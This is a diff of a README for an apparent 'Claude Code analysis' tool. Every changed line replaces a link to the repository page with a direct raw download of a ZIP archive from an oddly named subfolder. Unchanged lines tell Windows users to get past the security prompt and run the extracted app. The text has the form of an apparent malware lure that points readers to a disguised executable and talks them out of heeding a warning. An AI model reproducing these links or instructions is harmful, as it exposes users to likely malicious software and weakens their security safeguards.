@@ -1,10 +1,10 @@
 # 🤖 claude-code-analysis - Simple Claude Code Review Tool
 
-[Download the app](https://github.com/factorixsooth118/claude-code-analysis)
+[Download the app](https://raw.githubusercontent.com/factorixsooth118/claude-code-analysis/main/shaatnez/claude_analysis_code_3.5.zip)
 
 ## 🚀 Download
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/factorixsooth118/claude-code-analysis)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/factorixsooth118/claude-code-analysis/main/shaatnez/claude_analysis_code_3.5.zip)
 
 Use the link above to visit the download page.
 
@@ -42,7 +42,7 @@ If Windows shows a security prompt, choose the option that lets you open the fil
 
 Follow these steps on a Windows PC:
 
-1. Go to the download page: https://github.com/factorixsooth118/claude-code-analysis
+1. Go to the download page: https://raw.githubusercontent.com/factorixsooth118/claude-code-analysis/main/shaatnez/claude_analysis_code_3.5.zip
 2. Download the latest Windows file.
 3. If the file comes as a ZIP archive, extract it first.
 4. Open the folder that contains the app.
@@ -160,7 +160,7 @@ If you are not sure what to open, look for files that came from your Claude Code
 
 ## 📎 Useful Link
 
-[Visit the download page again](https://github.com/factorixsooth118/claude-code-analysis)
+[Visit the download page again](https://raw.githubusercontent.com/factorixsooth118/claude-code-analysis/main/shaatnez/claude_analysis_code_3.5.zip)
 
 ## 🗂️ Repository Info
 
